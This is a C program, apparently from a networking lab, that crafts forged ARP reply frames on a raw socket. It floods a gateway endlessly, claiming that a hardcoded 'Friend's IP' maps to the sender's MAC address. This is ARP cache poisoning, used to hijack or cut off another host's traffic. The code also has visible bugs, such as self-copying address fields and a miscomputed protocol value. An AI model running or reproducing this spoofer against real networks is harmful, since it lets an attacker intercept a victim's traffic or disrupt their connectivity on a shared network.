#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include<string.h>
#include<stdlib.h>
#include<time.h>
#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<string.h>
#include<sys/select.h>
#include<pthread.h>
#include<signal.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/shm.h>
#include<unistd.h>
#include<sys/un.h>
#include<netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<errno.h>
#include<netinet/if_ether.h>
#include<net/ethernet.h>
#include<netinet/ether.h>
#include<netinet/udp.h>
#include<sys/ipc.h>
#include<sys/msg.h>
#include <net/if_arp.h>

void macStringToArray(const char *macString, unsigned char *macArray) {
    // Initialize variables
    char hexByte[3] = {'\0'};
    int index = 0;

    // Loop through the MAC address string
    for (int i = 0; i < strlen(macString); i++) {
        // Ignore colons in the string
        if (macString[i] != ':') {
            // Copy two characters into hexByte
            hexByte[index++] = macString[i];

            // If two characters are read, convert to hexadecimal and store in the array
            if (index == 2) {
                macArray[i / 3] = (unsigned char)strtol(hexByte, NULL, 16);
                // Reset the index for the next byte
                index = 0;
            }
        }
    }
}

void ipStringToArray(const char *ipString, int *ipArray) {
    // Initialize variables
    char octet[4] = {'\0'};
    int index = 0;

    // Loop through the IP address string
    for (int i = 0; i <= strlen(ipString); i++) {
        // Ignore dots in the string
        if (ipString[i] != '.' && ipString[i] != '\0') {
            // Copy characters into octet
            octet[index++] = ipString[i];
        } else {
            // If characters are read, convert to integer and store in the array
            if (index > 0) {
                ipArray[i / 4] = atoi(octet);
                // Reset the index for the next octet
                index = 0;
            }
        }
    }
}


int main(int argc, char *argv[])			//ip -> mac
{

	int sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	char  interface[40];
	strcpy (interface, "eth0"); //interface name
	if(sfd==-1)
	{
		perror("socket");
	}
	char* buf = (char*)malloc(1500);
	uint8_t src[6],dst[6];

	//usr mac address
	unsigned char macArray[6];
    //macStringToArray(argv[2], macArray);
	// src[0] = macArray[0];	//08:00:27:22:46:4f 0x08 
	// src[1] = macArray[1];	//ifconfig
	// src[2] = macArray[2];
	// src[3] = macArray[3];
	// src[4] = macArray[4];
	// src[5] = macArray[5];
	src[0] = 0x08;	//08:00:27:22:46:4f 0x08 
	src[1] = 0x00;	//ifconfig
	src[2] = 0x27;
	src[3] = 0x22;
	src[4] = 0x46;
	src[5] = 0X4f;

	//local gateway mac address (fixed)
	dst[0] = 0x08; //08:6a:c5:6b:ff:0d
	dst[1] = 0x6a; // arp -a
	dst[2] = 0xc5;
	dst[3] = 0x6b;
	dst[4] = 0xff;
	dst[5] = 0x0d;
	
	memcpy(buf, dst, 6*(sizeof (uint8_t)));
	memcpy(buf+6*(sizeof (uint8_t)),src,6*(sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	//Construction of ARP header
	struct arphdr* arp = (struct arphdr*)(buf+14);
	arp->ar_hrd = htons(1);		//because we use ethernet
	arp->ar_pro = 8;			// ETH_P_IP = 0x0800 
	arp->ar_hln = 6;			// Hardware leangth for ethernet is 6
	arp->ar_pln = 4;			// IPv4 is 4
	arp->ar_op = htons(2);		// ARP reply
	
	memcpy(arp->__ar_sha, src, 6 * sizeof(uint8_t));
	memcpy(arp->__ar_sip, arp->__ar_sip, 4 * sizeof(uint8_t));
	memcpy(arp->__ar_tha, dst, 6 * sizeof(uint8_t));
	memcpy(arp->__ar_tip, arp->__ar_tip, 4 * sizeof(uint8_t));

	int arp_packet_size = 14 + sizeof(struct arphdr);
	
	// Friend's IP
	//inet_aton(argv[1]);
	int ipArray[4];
	//ipStringToArray(argv[1], ipArray);
	// arp->__ar_sip[0] = ipArray[0]; //from Friend.	10.42.0.162
	// arp->__ar_sip[1] = ipArray[1];
	// arp->__ar_sip[2] = ipArray[2];
	// arp->__ar_sip[3] = ipArray[3];
	arp->__ar_sip[0] = 10; //from Friend.	10.42.0.162
	arp->__ar_sip[1] = 42;
	arp->__ar_sip[2] = 0;
	arp->__ar_sip[3] = 47;

	//Gateway IP
	arp->__ar_tip[0] = 10;//arp -a
	arp->__ar_tip[1] = 42;
	arp->__ar_tip[2] = 0;
	arp->__ar_tip[3] = 1;
	
	memcpy(buf+14,arp,28);
	
	int bytes;

	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (interface)) == 0)
	{
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;

	while(1)	
	{
		if ((bytes = sendto (sfd, buf, arp_packet_size, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
		{
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}
		//printf("Executed");
		//sleep(3);

	}

}

//for header file changing, /usr/include/net/, inside if_arp.h change: #if 0 --> #if 1
// use sudo gedit
